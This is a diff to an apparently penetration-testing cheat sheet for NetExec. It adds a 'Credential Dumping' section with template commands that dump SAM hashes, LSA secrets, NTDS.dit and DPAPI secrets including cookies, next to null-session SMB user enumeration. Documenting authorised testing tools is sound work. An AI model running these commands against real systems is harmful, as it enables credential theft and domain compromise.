@@ -41,7 +41,7 @@ nxc smb 10.10.10.161 -u '' -p '' --users
 nxc smb 10.10.10.161 -u '' -p '' --groups
 ```
 
-You can also reproduce this behavior with `smbclient` or `rpcclient`
+This can also be achieved with [smbclient.md](smbclient.md "mention") or [rpcclient.md](rpcclient.md "mention").
 
 ```bash
 smbclient -N -U "" -L \\10.10.10.161
@@ -52,4 +52,38 @@ rpcclient -N -U "" -L \\10.10.10.161
 rpcclient $> enumdomusers
 user:[bonclay] rid:[0x46e]
 user:[zoro] rid:[0x46f]
+```
+
+## Credential Dumping
+
+### SAM Hashes Dump
+
+Dumps SAM hashes from the target system after a successful login. You can use `smb` or `winrm` services.
+
+```bash
+nxc <smb|winrm> <target> -u <USERNAME> -p <PASSWORD> --sam
+```
+
+### LSA Secrets Dump
+
+Dumps LSA secrets from the target system after a successful login. You can use `smb` or `winrm` services.
+
+```bash
+nxc <smb|winrm> <target> -u <USERNAME> -p <PASSWORD> --lsa
+```
+
+### NTDS File Dump
+
+Dumps the NTDS.dit file from the target Domain Controller after a successful login. You can use either `vss` or `drsuapi` as the method (`drsuapi` is the default). Use the `--user` option to dump only a specific user.
+
+```bash
+nxc smb <target> -u <USERNAME> -p <PASSWORD> --ntds [vss,drsupai ]
+```
+
+### DPAPI Secrets Dump
+
+Dumps DPAPI secrets from the target machine. You dump cookies with the `cookies` options or use the `nosystem` option not to dump the SYSTEM dpapi (better opsec).
+
+```bash
+nxc smb <target> -u <USERNAME> -p <PASSWORD> --dpapi [cookies,nosystem]
 ```
